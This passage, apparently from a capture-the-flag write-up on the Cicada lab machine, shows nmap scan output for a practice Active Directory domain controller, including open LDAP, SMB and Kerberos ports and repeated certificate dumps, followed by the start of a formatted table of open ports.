+</span></span><span style="display:flex;"><span>| DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjAL
+</span></span><span style="display:flex;"><span>| BglghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFAY5YMN7
+</span></span><span style="display:flex;"><span>| Sb0WV8GpzydFLPC+751AMB8GA1UdIwQYMBaAFIgPuAt1+B1uRE3nh16Q6gSBkTzp
+</span></span><span style="display:flex;"><span>| MIHLBgNVHR8EgcMwgcAwgb2ggbqggbeGgbRsZGFwOi8vL0NOPUNJQ0FEQS1EQy1D
+</span></span><span style="display:flex;"><span>| QSxDTj1DSUNBREEtREMsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2Vz
+</span></span><span style="display:flex;"><span>| LENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Y2ljYWRhLERDPWh0Yj9j
+</span></span><span style="display:flex;"><span>| ZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlz
+</span></span><span style="display:flex;"><span>| dHJpYnV0aW9uUG9pbnQwgb0GCCsGAQUFBwEBBIGwMIGtMIGqBggrBgEFBQcwAoaB
+</span></span><span style="display:flex;"><span>| nWxkYXA6Ly8vQ049Q0lDQURBLURDLUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXkl
+</span></span><span style="display:flex;"><span>| MjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPWNpY2Fk
+</span></span><span style="display:flex;"><span>| YSxEQz1odGI/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmlj
+</span></span><span style="display:flex;"><span>| YXRpb25BdXRob3JpdHkwQAYDVR0RBDkwN6AfBgkrBgEEAYI3GQGgEgQQ0dpG4APi
+</span></span><span style="display:flex;"><span>| HkGYUf0NXWYT14IUQ0lDQURBLURDLmNpY2FkYS5odGIwDQYJKoZIhvcNAQELBQAD
+</span></span><span style="display:flex;"><span>| ggEBAIrY4wzebzUMnbrfpkvGA715ds8pNq06CN4/24q0YmowD+XSR/OI0En8Z9LE
+</span></span><span style="display:flex;"><span>| eytwBsFZJk5qv9yY+WL4Ubb4chKSsNjuc5SzaHxXAVczpNlH/a4WAKfVMU2D6nOb
+</span></span><span style="display:flex;"><span>| xxqE1cVIcOyN4b3WUhRNltauw81EUTa4xT0WElw8FevodHlBXiUPUT9zrBhnvNkz
+</span></span><span style="display:flex;"><span>| obX8oU3zyMO89QwxsusZ0TLiT/EREW6N44J+ROTUzdJwcFNRl+oLsiK5z/ltLRmT
+</span></span><span style="display:flex;"><span>| P/gFJvqMFfK4x4/ftmQV5M3hb0rzUcS4NJCGtclEoxlJHRTDTG6yZleuHvKSN4JF
+</span></span><span style="display:flex;"><span>| ji6zxYOoOznp6JlmbakLb1ZRLA8<span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>|_-----END CERTIFICATE-----
+</span></span><span style="display:flex;"><span>|_ssl-date: TLS randomness does not represent time
+</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds? syn-ack ttl <span style="color:#ae81ff">127</span>
+</span></span><span style="display:flex;"><span>464/tcp   open  kpasswd5?     syn-ack ttl <span style="color:#ae81ff">127</span>
+</span></span><span style="display:flex;"><span>593/tcp   open  ncacn_http    syn-ack ttl <span style="color:#ae81ff">127</span> Microsoft Windows RPC over HTTP 1.0
+</span></span><span style="display:flex;"><span>636/tcp   open  ssl/ldap      syn-ack ttl <span style="color:#ae81ff">127</span> Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: cicada.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>CICADA-DC.cicada.htb
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:CICADA-DC.cicada.htb
+</span></span><span style="display:flex;"><span>| Issuer: commonName<span style="color:#f92672">=</span>CICADA-DC-CA/domainComponent<span style="color:#f92672">=</span>cicada
+</span></span><span style="display:flex;"><span>| Public Key type: rsa
+</span></span><span style="display:flex;"><span>| Public Key bits: <span style="color:#ae81ff">2048</span>
+</span></span><span style="display:flex;"><span>| Signature Algorithm: sha256WithRSAEncryption
+</span></span><span style="display:flex;"><span>| Not valid before: 2024-08-22T20:24:16
+</span></span><span style="display:flex;"><span>| Not valid after:  2025-08-22T20:24:16
+</span></span><span style="display:flex;"><span>| MD5:   9ec5:1a23:40ef:b5b8:3d2c:39d8:447d:db65
+</span></span><span style="display:flex;"><span>| SHA-1: 2c93:6d7b:cfd8:11b9:9f71:1a5a:155d:88d3:4a52:157a
+</span></span><span style="display:flex;"><span>| -----BEGIN CERTIFICATE-----
+</span></span><span style="display:flex;"><span>| MIIF4DCCBMigAwIBAgITHgAAAAOY38QFU4GSRAABAAAAAzANBgkqhkiG9w0BAQsF
+</span></span><span style="display:flex;"><span>| ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGY2ljYWRh
+</span></span><span style="display:flex;"><span>| MRUwEwYDVQQDEwxDSUNBREEtREMtQ0EwHhcNMjQwODIyMjAyNDE2WhcNMjUwODIy
+</span></span><span style="display:flex;"><span>| MjAyNDE2WjAfMR0wGwYDVQQDExRDSUNBREEtREMuY2ljYWRhLmh0YjCCASIwDQYJ
+</span></span><span style="display:flex;"><span>| KoZIhvcNAQEBBQADggEPADCCAQoCggEBAOatZznJ1Zy5E8fVFsDWtq531KAmTyX8
+</span></span><span style="display:flex;"><span>| BxPdIVefG1jKHLYTvSsQLVDuv02+p29iH9vnqYvIzSiFWilKCFBxtfOpyvCaEQua
+</span></span><span style="display:flex;"><span>| NaJqv3quymk/pw0xMfSLMuN5emPJ5yHtC7cantY51mSDrvXBxMVIf23JUKgbhqSc
+</span></span><span style="display:flex;"><span>| Srdh8fhL8XKgZXVjHmQZVn4ONg2vJP2tu7P1KkXXj7Mdry9GFEIpLdDa749PLy7x
+</span></span><span style="display:flex;"><span>| o1yw8CloMMtcFKwVaJHy7tMgwU5PVbFBeUhhKhQ8jBR3OBaMBtqIzIAJ092LNysy
+</span></span><span style="display:flex;"><span>| 4W6q8iWFc+Tb43gFP4nfb1Xvp5mJ2pStqCeZlneiL7Be0SqdDhljB4ECAwEAAaOC
+</span></span><span style="display:flex;"><span>| Au4wggLqMC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8A
+</span></span><span style="display:flex;"><span>| bABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/
+</span></span><span style="display:flex;"><span>| BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3
+</span></span><span style="display:flex;"><span>| DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjAL
+</span></span><span style="display:flex;"><span>| BglghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFAY5YMN7
+</span></span><span style="display:flex;"><span>| Sb0WV8GpzydFLPC+751AMB8GA1UdIwQYMBaAFIgPuAt1+B1uRE3nh16Q6gSBkTzp
+</span></span><span style="display:flex;"><span>| MIHLBgNVHR8EgcMwgcAwgb2ggbqggbeGgbRsZGFwOi8vL0NOPUNJQ0FEQS1EQy1D
+</span></span><span style="display:flex;"><span>| QSxDTj1DSUNBREEtREMsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2Vz
+</span></span><span style="display:flex;"><span>| LENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Y2ljYWRhLERDPWh0Yj9j
+</span></span><span style="display:flex;"><span>| ZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlz
+</span></span><span style="display:flex;"><span>| dHJpYnV0aW9uUG9pbnQwgb0GCCsGAQUFBwEBBIGwMIGtMIGqBggrBgEFBQcwAoaB
+</span></span><span style="display:flex;"><span>| nWxkYXA6Ly8vQ049Q0lDQURBLURDLUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXkl
+</span></span><span style="display:flex;"><span>| MjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPWNpY2Fk
+</span></span><span style="display:flex;"><span>| YSxEQz1odGI/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmlj
+</span></span><span style="display:flex;"><span>| YXRpb25BdXRob3JpdHkwQAYDVR0RBDkwN6AfBgkrBgEEAYI3GQGgEgQQ0dpG4APi
+</span></span><span style="display:flex;"><span>| HkGYUf0NXWYT14IUQ0lDQURBLURDLmNpY2FkYS5odGIwDQYJKoZIhvcNAQELBQAD
+</span></span><span style="display:flex;"><span>| ggEBAIrY4wzebzUMnbrfpkvGA715ds8pNq06CN4/24q0YmowD+XSR/OI0En8Z9LE
+</span></span><span style="display:flex;"><span>| eytwBsFZJk5qv9yY+WL4Ubb4chKSsNjuc5SzaHxXAVczpNlH/a4WAKfVMU2D6nOb
+</span></span><span style="display:flex;"><span>| xxqE1cVIcOyN4b3WUhRNltauw81EUTa4xT0WElw8FevodHlBXiUPUT9zrBhnvNkz
+</span></span><span style="display:flex;"><span>| obX8oU3zyMO89QwxsusZ0TLiT/EREW6N44J+ROTUzdJwcFNRl+oLsiK5z/ltLRmT
+</span></span><span style="display:flex;"><span>| P/gFJvqMFfK4x4/ftmQV5M3hb0rzUcS4NJCGtclEoxlJHRTDTG6yZleuHvKSN4JF
+</span></span><span style="display:flex;"><span>| ji6zxYOoOznp6JlmbakLb1ZRLA8<span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>|_-----END CERTIFICATE-----
+</span></span><span style="display:flex;"><span>|_ssl-date: TLS randomness does not represent time
+</span></span><span style="display:flex;"><span>3268/tcp  open  ldap          syn-ack ttl <span style="color:#ae81ff">127</span> Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: cicada.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>CICADA-DC.cicada.htb
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:CICADA-DC.cicada.htb
+</span></span><span style="display:flex;"><span>| Issuer: commonName<span style="color:#f92672">=</span>CICADA-DC-CA/domainComponent<span style="color:#f92672">=</span>cicada
+</span></span><span style="display:flex;"><span>| Public Key type: rsa
+</span></span><span style="display:flex;"><span>| Public Key bits: <span style="color:#ae81ff">2048</span>
+</span></span><span style="display:flex;"><span>| Signature Algorithm: sha256WithRSAEncryption
+</span></span><span style="display:flex;"><span>| Not valid before: 2024-08-22T20:24:16
+</span></span><span style="display:flex;"><span>| Not valid after:  2025-08-22T20:24:16
+</span></span><span style="display:flex;"><span>| MD5:   9ec5:1a23:40ef:b5b8:3d2c:39d8:447d:db65
+</span></span><span style="display:flex;"><span>| SHA-1: 2c93:6d7b:cfd8:11b9:9f71:1a5a:155d:88d3:4a52:157a
+</span></span><span style="display:flex;"><span>| -----BEGIN CERTIFICATE-----
+</span></span><span style="display:flex;"><span>| MIIF4DCCBMigAwIBAgITHgAAAAOY38QFU4GSRAABAAAAAzANBgkqhkiG9w0BAQsF
+</span></span><span style="display:flex;"><span>| ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGY2ljYWRh
+</span></span><span style="display:flex;"><span>| MRUwEwYDVQQDEwxDSUNBREEtREMtQ0EwHhcNMjQwODIyMjAyNDE2WhcNMjUwODIy
+</span></span><span style="display:flex;"><span>| MjAyNDE2WjAfMR0wGwYDVQQDExRDSUNBREEtREMuY2ljYWRhLmh0YjCCASIwDQYJ
+</span></span><span style="display:flex;"><span>| KoZIhvcNAQEBBQADggEPADCCAQoCggEBAOatZznJ1Zy5E8fVFsDWtq531KAmTyX8
+</span></span><span style="display:flex;"><span>| BxPdIVefG1jKHLYTvSsQLVDuv02+p29iH9vnqYvIzSiFWilKCFBxtfOpyvCaEQua
+</span></span><span style="display:flex;"><span>| NaJqv3quymk/pw0xMfSLMuN5emPJ5yHtC7cantY51mSDrvXBxMVIf23JUKgbhqSc
+</span></span><span style="display:flex;"><span>| Srdh8fhL8XKgZXVjHmQZVn4ONg2vJP2tu7P1KkXXj7Mdry9GFEIpLdDa749PLy7x
+</span></span><span style="display:flex;"><span>| o1yw8CloMMtcFKwVaJHy7tMgwU5PVbFBeUhhKhQ8jBR3OBaMBtqIzIAJ092LNysy
+</span></span><span style="display:flex;"><span>| 4W6q8iWFc+Tb43gFP4nfb1Xvp5mJ2pStqCeZlneiL7Be0SqdDhljB4ECAwEAAaOC
+</span></span><span style="display:flex;"><span>| Au4wggLqMC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8A
+</span></span><span style="display:flex;"><span>| bABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/
+</span></span><span style="display:flex;"><span>| BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3
+</span></span><span style="display:flex;"><span>| DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjAL
+</span></span><span style="display:flex;"><span>| BglghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFAY5YMN7
+</span></span><span style="display:flex;"><span>| Sb0WV8GpzydFLPC+751AMB8GA1UdIwQYMBaAFIgPuAt1+B1uRE3nh16Q6gSBkTzp
+</span></span><span style="display:flex;"><span>| MIHLBgNVHR8EgcMwgcAwgb2ggbqggbeGgbRsZGFwOi8vL0NOPUNJQ0FEQS1EQy1D
+</span></span><span style="display:flex;"><span>| QSxDTj1DSUNBREEtREMsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2Vz
+</span></span><span style="display:flex;"><span>| LENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Y2ljYWRhLERDPWh0Yj9j
+</span></span><span style="display:flex;"><span>| ZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlz
+</span></span><span style="display:flex;"><span>| dHJpYnV0aW9uUG9pbnQwgb0GCCsGAQUFBwEBBIGwMIGtMIGqBggrBgEFBQcwAoaB
+</span></span><span style="display:flex;"><span>| nWxkYXA6Ly8vQ049Q0lDQURBLURDLUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXkl
+</span></span><span style="display:flex;"><span>| MjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPWNpY2Fk
+</span></span><span style="display:flex;"><span>| YSxEQz1odGI/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmlj
+</span></span><span style="display:flex;"><span>| YXRpb25BdXRob3JpdHkwQAYDVR0RBDkwN6AfBgkrBgEEAYI3GQGgEgQQ0dpG4APi
+</span></span><span style="display:flex;"><span>| HkGYUf0NXWYT14IUQ0lDQURBLURDLmNpY2FkYS5odGIwDQYJKoZIhvcNAQELBQAD
+</span></span><span style="display:flex;"><span>| ggEBAIrY4wzebzUMnbrfpkvGA715ds8pNq06CN4/24q0YmowD+XSR/OI0En8Z9LE
+</span></span><span style="display:flex;"><span>| eytwBsFZJk5qv9yY+WL4Ubb4chKSsNjuc5SzaHxXAVczpNlH/a4WAKfVMU2D6nOb
+</span></span><span style="display:flex;"><span>| xxqE1cVIcOyN4b3WUhRNltauw81EUTa4xT0WElw8FevodHlBXiUPUT9zrBhnvNkz
+</span></span><span style="display:flex;"><span>| obX8oU3zyMO89QwxsusZ0TLiT/EREW6N44J+ROTUzdJwcFNRl+oLsiK5z/ltLRmT
+</span></span><span style="display:flex;"><span>| P/gFJvqMFfK4x4/ftmQV5M3hb0rzUcS4NJCGtclEoxlJHRTDTG6yZleuHvKSN4JF
+</span></span><span style="display:flex;"><span>| ji6zxYOoOznp6JlmbakLb1ZRLA8<span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>|_-----END CERTIFICATE-----
+</span></span><span style="display:flex;"><span>|_ssl-date: TLS randomness does not represent time
+</span></span><span style="display:flex;"><span>3269/tcp  open  ssl/ldap      syn-ack ttl <span style="color:#ae81ff">127</span> Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: cicada.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>CICADA-DC.cicada.htb
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:CICADA-DC.cicada.htb
+</span></span><span style="display:flex;"><span>| Issuer: commonName<span style="color:#f92672">=</span>CICADA-DC-CA/domainComponent<span style="color:#f92672">=</span>cicada
+</span></span><span style="display:flex;"><span>| Public Key type: rsa
+</span></span><span style="display:flex;"><span>| Public Key bits: <span style="color:#ae81ff">2048</span>
+</span></span><span style="display:flex;"><span>| Signature Algorithm: sha256WithRSAEncryption
+</span></span><span style="display:flex;"><span>| Not valid before: 2024-08-22T20:24:16
+</span></span><span style="display:flex;"><span>| Not valid after:  2025-08-22T20:24:16
+</span></span><span style="display:flex;"><span>| MD5:   9ec5:1a23:40ef:b5b8:3d2c:39d8:447d:db65
+</span></span><span style="display:flex;"><span>| SHA-1: 2c93:6d7b:cfd8:11b9:9f71:1a5a:155d:88d3:4a52:157a
+</span></span><span style="display:flex;"><span>| -----BEGIN CERTIFICATE-----
+</span></span><span style="display:flex;"><span>| MIIF4DCCBMigAwIBAgITHgAAAAOY38QFU4GSRAABAAAAAzANBgkqhkiG9w0BAQsF
+</span></span><span style="display:flex;"><span>| ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGY2ljYWRh
+</span></span><span style="display:flex;"><span>| MRUwEwYDVQQDEwxDSUNBREEtREMtQ0EwHhcNMjQwODIyMjAyNDE2WhcNMjUwODIy
+</span></span><span style="display:flex;"><span>| MjAyNDE2WjAfMR0wGwYDVQQDExRDSUNBREEtREMuY2ljYWRhLmh0YjCCASIwDQYJ
+</span></span><span style="display:flex;"><span>| KoZIhvcNAQEBBQADggEPADCCAQoCggEBAOatZznJ1Zy5E8fVFsDWtq531KAmTyX8
+</span></span><span style="display:flex;"><span>| BxPdIVefG1jKHLYTvSsQLVDuv02+p29iH9vnqYvIzSiFWilKCFBxtfOpyvCaEQua
+</span></span><span style="display:flex;"><span>| NaJqv3quymk/pw0xMfSLMuN5emPJ5yHtC7cantY51mSDrvXBxMVIf23JUKgbhqSc
+</span></span><span style="display:flex;"><span>| Srdh8fhL8XKgZXVjHmQZVn4ONg2vJP2tu7P1KkXXj7Mdry9GFEIpLdDa749PLy7x
+</span></span><span style="display:flex;"><span>| o1yw8CloMMtcFKwVaJHy7tMgwU5PVbFBeUhhKhQ8jBR3OBaMBtqIzIAJ092LNysy
+</span></span><span style="display:flex;"><span>| 4W6q8iWFc+Tb43gFP4nfb1Xvp5mJ2pStqCeZlneiL7Be0SqdDhljB4ECAwEAAaOC
+</span></span><span style="display:flex;"><span>| Au4wggLqMC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8A
+</span></span><span style="display:flex;"><span>| bABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/
+</span></span><span style="display:flex;"><span>| BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3
+</span></span><span style="display:flex;"><span>| DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjAL
+</span></span><span style="display:flex;"><span>| BglghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFAY5YMN7
+</span></span><span style="display:flex;"><span>| Sb0WV8GpzydFLPC+751AMB8GA1UdIwQYMBaAFIgPuAt1+B1uRE3nh16Q6gSBkTzp
+</span></span><span style="display:flex;"><span>| MIHLBgNVHR8EgcMwgcAwgb2ggbqggbeGgbRsZGFwOi8vL0NOPUNJQ0FEQS1EQy1D
+</span></span><span style="display:flex;"><span>| QSxDTj1DSUNBREEtREMsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2Vz
+</span></span><span style="display:flex;"><span>| LENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Y2ljYWRhLERDPWh0Yj9j
+</span></span><span style="display:flex;"><span>| ZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlz
+</span></span><span style="display:flex;"><span>| dHJpYnV0aW9uUG9pbnQwgb0GCCsGAQUFBwEBBIGwMIGtMIGqBggrBgEFBQcwAoaB
+</span></span><span style="display:flex;"><span>| nWxkYXA6Ly8vQ049Q0lDQURBLURDLUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXkl
+</span></span><span style="display:flex;"><span>| MjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPWNpY2Fk
+</span></span><span style="display:flex;"><span>| YSxEQz1odGI/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmlj
+</span></span><span style="display:flex;"><span>| YXRpb25BdXRob3JpdHkwQAYDVR0RBDkwN6AfBgkrBgEEAYI3GQGgEgQQ0dpG4APi
+</span></span><span style="display:flex;"><span>| HkGYUf0NXWYT14IUQ0lDQURBLURDLmNpY2FkYS5odGIwDQYJKoZIhvcNAQELBQAD
+</span></span><span style="display:flex;"><span>| ggEBAIrY4wzebzUMnbrfpkvGA715ds8pNq06CN4/24q0YmowD+XSR/OI0En8Z9LE
+</span></span><span style="display:flex;"><span>| eytwBsFZJk5qv9yY+WL4Ubb4chKSsNjuc5SzaHxXAVczpNlH/a4WAKfVMU2D6nOb
+</span></span><span style="display:flex;"><span>| xxqE1cVIcOyN4b3WUhRNltauw81EUTa4xT0WElw8FevodHlBXiUPUT9zrBhnvNkz
+</span></span><span style="display:flex;"><span>| obX8oU3zyMO89QwxsusZ0TLiT/EREW6N44J+ROTUzdJwcFNRl+oLsiK5z/ltLRmT
+</span></span><span style="display:flex;"><span>| P/gFJvqMFfK4x4/ftmQV5M3hb0rzUcS4NJCGtclEoxlJHRTDTG6yZleuHvKSN4JF
+</span></span><span style="display:flex;"><span>| ji6zxYOoOznp6JlmbakLb1ZRLA8<span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>|_-----END CERTIFICATE-----
+</span></span><span style="display:flex;"><span>|_ssl-date: TLS randomness does not represent time
+</span></span><span style="display:flex;"><span>5985/tcp  open  http          syn-ack ttl <span style="color:#ae81ff">127</span> Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-title: Not Found
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span style="display:flex;"><span>62424/tcp open  msrpc         syn-ack ttl <span style="color:#ae81ff">127</span> Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host script results:
+</span></span><span style="display:flex;"><span>| smb2-security-mode: 
+</span></span><span style="display:flex;"><span>|   3:1:1: 
+</span></span><span style="display:flex;"><span>|_    Message signing enabled and required
+</span></span><span style="display:flex;"><span>|_clock-skew: 6h59m59s
+</span></span><span style="display:flex;"><span>| smb2-time: 
+</span></span><span style="display:flex;"><span>|   date: 2025-01-26T03:26:49
+</span></span><span style="display:flex;"><span>|_  start_date: N/A
+</span></span><span style="display:flex;"><span>| p2p-conficker: 
+</span></span><span style="display:flex;"><span>|   Checking <span style="color:#66d9ef">for</span> Conficker.C or higher...
+</span></span><span style="display:flex;"><span>|   Check <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>port 43674/tcp<span style="color:#f92672">)</span>: CLEAN <span style="color:#f92672">(</span>Timeout<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   Check <span style="color:#ae81ff">2</span> <span style="color:#f92672">(</span>port 38244/tcp<span style="color:#f92672">)</span>: CLEAN <span style="color:#f92672">(</span>Timeout<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   Check <span style="color:#ae81ff">3</span> <span style="color:#f92672">(</span>port 62917/udp<span style="color:#f92672">)</span>: CLEAN <span style="color:#f92672">(</span>Timeout<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   Check <span style="color:#ae81ff">4</span> <span style="color:#f92672">(</span>port 61453/udp<span style="color:#f92672">)</span>: CLEAN <span style="color:#f92672">(</span>Timeout<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>NSE: Script Post-scanning.
+</span></span><span style="display:flex;"><span>NSE: Starting runlevel <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>of 3<span style="color:#f92672">)</span> scan.
+</span></span><span style="display:flex;"><span>Initiating NSE at 21:27
+</span></span><span style="display:flex;"><span>Completed NSE at 21:27, 0.00s elapsed
+</span></span><span style="display:flex;"><span>NSE: Starting runlevel <span style="color:#ae81ff">2</span> <span style="color:#f92672">(</span>of 3<span style="color:#f92672">)</span> scan.
+</span></span><span style="display:flex;"><span>Initiating NSE at 21:27
+</span></span><span style="display:flex;"><span>Completed NSE at 21:27, 0.00s elapsed
+</span></span><span style="display:flex;"><span>NSE: Starting runlevel <span style="color:#ae81ff">3</span> <span style="color:#f92672">(</span>of 3<span style="color:#f92672">)</span> scan.
+</span></span><span style="display:flex;"><span>Initiating NSE at 21:27
+</span></span><span style="display:flex;"><span>Completed NSE at 21:27, 0.00s elapsed
+</span></span><span style="display:flex;"><span>Read data files from: /usr/share/nmap
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 293.43 seconds
+</span></span><span style="display:flex;"><span>           Raw packets sent: <span style="color:#ae81ff">131207</span> <span style="color:#f92672">(</span>5.773MB<span style="color:#f92672">)</span> | Rcvd: <span style="color:#ae81ff">151</span> <span style="color:#f92672">(</span>6.628KB<span style="color:#f92672">)</span>
+</span></span></code></pre></div><h1 id="nmap-scan-report-for-10101135">Nmap Scan Report for 10.10.11.35<a hidden class="anchor" aria-hidden="true" href="#nmap-scan-report-for-10101135">#</a></h1>
+<p><strong>Scan Initiated:</strong> 2025-01-25 21:22 CET<br>
+<strong>Scan Duration:</strong> 293 seconds<br>
+<strong>Host Status:</strong> Up (echo-reply ttl 127, 0.027s latency)</p>
+<h2 id="open-ports">Open Ports<a hidden class="anchor" aria-hidden="true" href="#open-ports">#</a></h2>
+<p>The following ports were found open:</p>
+<table>
+<thead>
+<tr>
+<th>Port</th>
+<th>Service</th>
+<th>Version</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>53/tcp</td>
+<td>domain</td>
+<td>Simple DNS Plus</td>
+</tr>
+<tr>
+<td>88/tcp</td>
+<td>kerberos-sec</td>
+<td>Microsoft Windows Kerberos</td>
+</tr>
+<tr>
+<td>135/tcp</td>
+<td>msrpc</td>
+<td>Microsoft Windows RPC</td>
+</tr>
+<tr>
+<td>139/tcp</td>
+<td>netbios-ssn</td>
+<td>Microsoft Windows netbios-ssn</td>
+</tr>
+<tr>
+<td>389/tcp</td>
+<td>ldap</td>
+<td>Microsoft Windows Active Directory LDAP</td>
+</tr>
+<tr>
+<td>445/tcp</td>
+<td>microsoft-ds</td>
+<td>Unknown</td>
+</tr>
+<tr>
+<td>464/tcp</td>
+<td>kpasswd5</td>
+<td>Unknown</td>
+</tr>
+<tr>
+<td>593/tcp</td>
+<td>ncacn_http</td>
+<td>Microsoft Windows RPC over HTTP 1.0</td>
+</tr>
+<tr>
+<td>636/tcp</td>
+<td>ssl/ldap</td>
+<td>Microsoft Windows Active Directory LDAP</td>
+</tr>
+<tr>
+<td>3268/tcp</td>
+<td>ldap</td>
+<td>Microsoft Windows Active Directory LDAP</td>
+</tr>
+<tr>
+<td>3269/tcp</td>
+<td>ssl/ldap</td>
+<td>Microsoft Windows Active Directory LDAP</td>
+</tr>
+</tbody>
+</table>
+<h2 id="ssl-certificates">SSL Certificates<a hidden class="anchor" aria-hidden="true" href="#ssl-certificates">#</a></h2>
